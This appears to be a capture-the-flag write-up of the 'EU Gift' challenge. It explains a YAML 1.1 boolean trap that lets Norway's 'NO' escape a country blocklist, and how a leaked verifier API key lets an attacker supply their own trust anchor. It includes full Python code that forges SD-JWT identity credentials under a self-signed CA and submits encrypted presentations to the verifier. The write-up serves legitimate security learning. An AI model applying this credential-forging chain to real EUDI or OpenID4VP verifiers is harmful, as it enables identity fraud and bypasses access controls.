---
title: "EU Gift"
category: "Misc"
tags: ["openid4vp", "eudi-wallet", "sd-jwt", "yaml-boolean-trap", "trust-anchor"]
solve_date: "2026-10-10"
language: "en"
---

# EU Gift

**Flag:** `FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}`
**Handout:** `handout.zip` (12 KB) — `app.py` 15456 B, `config.yml` 3549 B, `private/flag.svg` 538 B.
**Instance:** `eu-gift-b21969cb4bc8.inst10.ctf.fortid.com` (replacing `eu-gift-062d370d0c67.inst10.ctf.fortid.com`, which stopped answering and returned `404 page not found` from the ingress). **External verifier:** `https://evs.fortid.com`. Author: ipaljak.

## Challenge

The Flask app "Free Flags for EU Citizens" gives the flag only to citizens of countries that already run an official EUDI wallet. The flow is:

1. `POST /flag` creates a verification session on the FortID EVS service (`/verification-session/initiate`) and returns a QR payload `openid4vp://authorize?...request_uri=...`.
2. The player acts as the wallet and posts a `direct_post.jwt` response to the session's `response_uri`.
3. EVS validates the presentation and stores `presentedClaims`.
4. `GET /flag/<verification_session_id>` asks EVS again; if the status is `VERIFICATION_SUCCEEDED` and the country is not blocked, the app renders the flag image.

The handout contains the app source and its configuration, but no wallet. The flag is inside the image the server returns, not inside the handout.

## Analysis

### Defect 1: `- NO` is the boolean `False` in YAML

The blocklist is written as bare alpha-2 codes:

```yaml
# Deny list of all countries that haven't yet released the official EUDI wallet
# as a hardening protection against hackers.
blocked_countries:
  - AD
  - AE
  ...
  - NL
  - NO
  - NP
  ...
  - ZA
  - ZM
  - ZW
```

YAML 1.1 treats `NO` as a boolean negation keyword, so that entry is not the string `"NO"`:

```python
import yaml
bc = yaml.safe_load(open("config.yml", encoding="utf-8"))["blocked_countries"]
print("entries:", len(bc))
print("non-string:", [(x, type(x).__name__) for x in bc if not isinstance(x, str)])
print("'NO' in list:", "NO" in [x for x in bc if isinstance(x, str)])
```

```text
entries: 249
non-string: [(False, 'bool')]
'NO' in list: False
```

249 entries, exactly one of them not a string, and its value is `False`. `app.py` loads that list straight into a set:

```python
BLOCKED_COUNTRIES = set(CONFIG.get("blocked_countries", []))
```

while the check itself requires a valid string country code according to `pycountry`:

```python
def normalize_country_value(value: Any) -> list[str]:
    values = value if isinstance(value, list) else [value]
    normalized: list[str] = []
    for item in values:
        if isinstance(item, str) and COUNTRY_CODE_PATTERN.fullmatch(item) and item in VALID_COUNTRY_CODES:
            normalized.append(item)
    return normalized


def evaluate_country_claims(claims: dict[str, Any]) -> tuple[str | None, str]:
    issuing_country = normalize_country_value(read_claim(claims, "issuing_country"))

    if not issuing_country:
        return None, "missing_issuing_country"

    country = issuing_country[0]
    if country in BLOCKED_COUNTRIES:
        return country, "blocked_country"

    return country, "allowed"
```

`VALID_COUNTRY_CODES` is built from `pycountry.countries`, so `NO` is valid (`pycountry.countries.get(alpha_2="NO")` → Norway) and passes `normalize_country_value`. The test `country in BLOCKED_COUNTRIES` then compares the string `"NO"` against a set holding `False`, which makes `NO` the only alpha-2 code that escapes the blocklist: the count above shows the other 248 entries are all strings, so no other code is dropped.

### Defect 2: the handout leaks the verifier API key, which lets the caller choose the trust anchor

`config.yml` carries the validation service key and base URL:

```yaml
verifier:
  base_url: https://evs.fortid.com
  api_key_env: FORTID_VERIFIER_API_KEY
  api_key: "[redacted from public copy]"
  initiate_path: /verification-session/initiate
  status_path_template: /verification-session/status/{verification_session_id}
  credential_description:
    - credentialType: urn:eudi:pid:1
      credentialFormat: dc+sd-jwt
      disclosurePaths:
        - [issuing_country]
  trust_config:
    - type: x5chain_root
      cert: |
        -----BEGIN CERTIFICATE-----
        ... (FortID Dev CA, body omitted) ...
        -----END CERTIFICATE-----
  protocol_config:
    clientIdScheme: pre-registered
    responseMode: direct_post.jwt
  authorization_request_type: byReference
```

The app calls EVS with this key, but the same key lets anyone call `/verification-session/initiate` directly with their own `trustConfig`. `trustConfig` is the list of root CAs used to validate the `x5c` chain inside the sd-jwt; replacing FortID's root with a self-signed one means the attacker can issue credentials EVS itself will accept. Two `initiate` calls, one with `trust_all` and one with a self-signed CA, both returned a normal session id, so nothing rejects a caller-supplied `trustConfig`.

In addition, `GET /flag/<session>` only forwards the session id to EVS:

```python
def load_verification_result(verification_session_id: str) -> tuple[dict[str, Any], dict[str, Any] | None]:
    status_data = fetch_verification_session_status(verification_session_id)
    if status_data.get("verificationSessionStatus") != "VERIFICATION_SUCCEEDED":
        return status_data, None

    evaluation = evaluate_claims(status_data.get("presentedClaims"))
    return status_data, evaluation
```

So a session the attacker started directly against EVS is equally acceptable to the app, as long as EVS reports `VERIFICATION_SUCCEEDED`. There is no need to go through the app's QR at all.

The session's request object (a JWT decoded from `request_uri`) shows what a presentation has to satisfy: `response_mode: direct_post.jwt`, `require_crypto_holder_binding: true`, DCQL path `issuing_country`, and an `ECDH-ES`/`A256GCM` JWK (`kid: FortID-Verifier-Ephemeral`) used to encrypt the response.

### Decoy: `private/flag.svg`

The handout ships `private/flag.svg` (538 B) containing:

```text
FortID{this_is_a_fake_flag}
```

with the label `Local handout placeholder` right below it. That is the flag image of the handout build (`flag_image: private/flag.svg`), not the instance's; the live build returns a different JPEG. This branch is excluded by the label inside the file itself and by the fact that the image returned by the instance does not match it.

## Solution

Three files: `eudi_lib.py` (6.5 KB, SD-JWT/JWE/X.509 primitives), `issuer.py` (7.1 KB, certificate building and the `initiate` call), `final.py` (the end-to-end chain). The primitives worth reading:

```python
def make_jwt(header: dict, payload: dict, key) -> str:
    h = U(json.dumps(header, separators=(",", ":")).encode())
    p = U(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{U(sign_es256(key, f'{h}.{p}'.encode()))}"


def make_disclosure(name, value):
    return U(json.dumps([U(os.urandom(16)), name, value], separators=(",", ":")).encode())


def sd_hash(d):
    return U(hashlib.sha256(d.encode("ascii")).digest())


def jwe_encrypt(recipient_pub, plaintext: bytes, extra_protected: dict | None = None,
                apu: bytes = b"", apv: bytes = b"") -> str:
    epk = new_key()
    z = epk.exchange(ec.ECDH(), recipient_pub)
    cek = concat_kdf(z, b"A256GCM", 256, apu, apv)
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    pn = epk.public_key().public_numbers()
    protected = {"alg": "ECDH-ES", "enc": "A256GCM", "epk": pub_jwk(epk.public_key())}
    if apu:
        protected["apu"] = apu
    if apv:
        protected["apv"] = apv
    if extra_protected:
        protected.update(extra_protected)
    ph = U(json.dumps(protected, separators=(",", ":")).encode())
    iv = os.urandom(12)
    blob = AESGCM(cek).encrypt(iv, plaintext, ph.encode("ascii"))
    return f"{ph}..{U(iv)}.{U(blob[:-16])}.{U(blob[-16:])}"
```

The end-to-end driver (`final.py`), where `build()` creates a self-signed CA and makes it the root, `present()` submits the presentation, and `main()` polls the status and then fetches the flag:

```python
"""End-to-end: rogue wallet completes a session, then the app reveals the flag."""
from __future__ import annotations

import base64
import json
import re
import sys
import time
import os
from urllib.parse import unquote

import requests

sys.path.insert(0, ".")
from eudi_lib import (  # noqa: E402
    U, UB64, cert_b64, cert_pem, jwe_encrypt, jwk_to_pub, make_disclosure, make_jwt, new_key,
    pub_jwk, sd_hash,
)
from issuer import init, make_cert  # noqa: E402

APP = "https://eu-gift-b21969cb4bc8.inst10.ctf.fortid.com"
API = "https://evs.fortid.com"
KEY = os.environ["FORTID_VERIFIER_API_KEY"]
HK = {"Content-Type": "application/json", "X-API-KEY": KEY}

holder_key = new_key()


def build(trust_kind="leaf_is_root", country="NO"):
    if trust_kind == "leaf_is_root":
        k = new_key()
        cert = make_cert(k, "FortID Dev Issuer", san_dns="issuer.test", ca=True)
        chain = [cert_b64(cert)]
        trust = [{"type": "x5chain_root", "cert": cert_pem(cert)}]
        return k, chain, trust
    caK, leafK = new_key(), new_key()
    ca = make_cert(caK, "FortID Dev CA", ca=True)
    leaf = make_cert(leafK, "FortID Dev Issuer", san_dns="issuer.test",
                     issuer_key=caK, issuer_dn=ca.subject)
    return leafK, [cert_b64(leaf), cert_b64(ca)], [{"type": "x5chain_root", "cert": cert_pem(ca)}]


def present(s, ikey, chain, country):
    ro = s["ro"]
    now = int(time.time())
    disc = make_disclosure("issuing_country", country)
    payload = {"iss": "https://issuer.test", "sub": "holder-1", "iat": now - 3600,
               "nbf": now - 3600, "exp": now + 86400 * 300, "vct": "urn:eudi:pid:1",
               "cnf": {"jwk": pub_jwk(holder_key.public_key())}}
    body = dict(payload)
    body["_sd"] = [sd_hash(disc)]
    body["_sd_alg"] = "sha-256"
    jwt = make_jwt({"typ": "dc+sd-jwt", "alg": "ES256", "x5c": chain}, body, ikey)
    sd = jwt + "~" + disc + "~"
    kb = make_jwt({"typ": "kb+jwt", "alg": "ES256"},
                  {"iat": now, "nbf": now, "aud": ro["client_id"], "nonce": ro["nonce"],
                   "sd_hash": U(__import__("hashlib").sha256(sd.encode()).digest())}, holder_key)
    pres = sd + kb
    jwk = ro["client_metadata"]["jwks"]["keys"][0]
    payload_bytes = json.dumps({"vp_token": {s["cid"]: [pres]}, "state": ro["state"]},
                               separators=(",", ":")).encode()
    value = jwe_encrypt(jwk_to_pub(jwk), payload_bytes,
                        extra_protected={"kid": jwk["kid"], "cty": "json"})
    r = requests.post(ro["response_uri"], data={"response": value, "state": ro["state"]}, timeout=60)
    return r.status_code, r.text.strip()


def main():
    country = sys.argv[1] if len(sys.argv) > 1 else "NO"
    ikey, chain, trust = build()
    s = init(trust)
    code, text = present(s, ikey, chain, country)
    st = requests.get(f"{API}/verification-session/status/{s['session']}", headers=HK, timeout=60).json()
    print(f"session={s['session']} POST={code} {text[:60]!r}")
    print(f"evs status: {json.dumps(st)[:300]}")
    if st.get("verificationSessionStatus") != "VERIFICATION_SUCCEEDED":
        return
    r = requests.get(f"{APP}/flag/{s['session']}", timeout=60)
    print(f"app /flag -> {r.status_code} len={len(r.text)}")
    m = re.search(r'src="data:image/svg\+xml;base64,([^"]+)"', r.text)
    if not m:
        print(r.text[:1200])
        return
    svg = base64.b64decode(m.group(1)).decode("utf-8", "replace")
    print("---- flag.svg ----")
    print(svg)
    open("flag_live.svg", "w", encoding="utf-8").write(svg)


if __name__ == "__main__":
    main()
```

`init(trust)` in `issuer.py` is where the self-chosen `trustConfig` is sent:

```python
def init(trust_config):
    r = requests.post(f"{API}/verification-session/initiate", headers=HK, timeout=60,
                      json={"credentialDescription": CD, "trustConfig": trust_config,
                            "protocolConfig": PROT, "authorizationRequestType": "byReference"})
    d = r.json()
    uri = unquote(d["authorization_request"].split("request_uri=")[1].split("&")[0])
    ro = json.loads(UB64(requests.get(uri, timeout=60).text.split(".")[1]))
    return {"session": d["verificationSessionId"], "ro": ro,
            "cid": ro["dcql_query"]["credentials"][0]["id"]}
```

With a self-signed root, the rest of `x5c` handling is technical detail: EVS requires `typ: dc+sd-jwt`, disclosures matching their hashes, and a `kb+jwt` bound to `nonce` + `aud` + `sd_hash` because the request object sets `require_crypto_holder_binding: true`. The matrix of issuer-identity variants (`issuer.py`, one row per SAN/CN/iss combination) produced:

```text
A root-is-issuer dns, iss=https://issuer.test 200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576565}}
    *** SESSION [ID REDACTED] ***
C san=dns issuer.test              200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576576}}
    *** SESSION [ID REDACTED] ***
D san=uri https://issuer.test      200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576588}}
    *** SESSION [ID REDACTED] ***
F cn=issuer.test, iss=https        200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576614}}
    *** SESSION [ID REDACTED] ***
G + cred aud=client_id             200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576623,"aud":"FortID-Verifier-Service"}}
    *** SESSION [ID REDACTED] ***
```

`presentedClaims.issuing_country = "NO"` is what EVS confirms, so the app's `evaluate_country_claims` returns `"allowed"`. The final step is `GET /flag/<session>` on the instance: HTTP 200, a 169,663-byte HTML page embedding the flag image as a data URL — a 126,211-byte JPEG (750x500), saved as `flag_live.jpg`. The app's `flag.html` renders the image through `build_flag_data_url`, which derives the media type with `mimetypes.guess_type(path.name)`, so the live build (`flag_image` pointing at a `.jpg` file) returns `data:image/jpeg;base64,...` rather than the handout's `image/svg+xml`; the regex in the `final.py` listing above is the handout variant and had to be changed when extracting the image from the instance.

The image is a meme whose text is rendered on two lines; cropping the two lines separately (`top.png`, `bottom.png`) gives text that reads directly:

```text
FortID{Erl1ng_15_7h3_5olut1on
7o_Th3_Norw4y_Pr0bl3m}
```

The character joining the two lines appears in neither crop; the final value uses `_` there, following the separator convention of the rest of the string, and that is the only character not read directly from the image.

## Result

```text
FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Both sides have to be alive: the app instance (for `/flag/<session>`) and `https://evs.fortid.com` (which performs the actual validation). There is no offline path, since session ids and QR payloads come from EVS.

```console
$ pip install requests cryptography PyYAML pycountry
$ unzip handout.zip
```

The solve needs all three scripts: `eudi_lib.py` (primitives), `issuer.py` (`make_cert`, `init`, the SAN/CN matrix), `final.py` (driver). Save the code blocks in the Solution section as `eudi_lib.py`, `issuer.py` and `final.py` in one directory — note that `final.py` needs `make_cert` and `init` as in the original `issuer.py` (7.1 KB, with more certificate-building helpers than the excerpt shown). Then:

```console
$ python final.py NO
```

If the instance's `flag_image` is a JPEG, change the regex in `main()` to match `data:image/jpeg;base64,`, write the bytes to `flag_live.jpg` and read the text off the image; the two text lines correspond to the crops `top.png` and `bottom.png`. To check the YAML defect on its own, run the short `python` snippet from the Analysis section against the handout's `config.yml`.
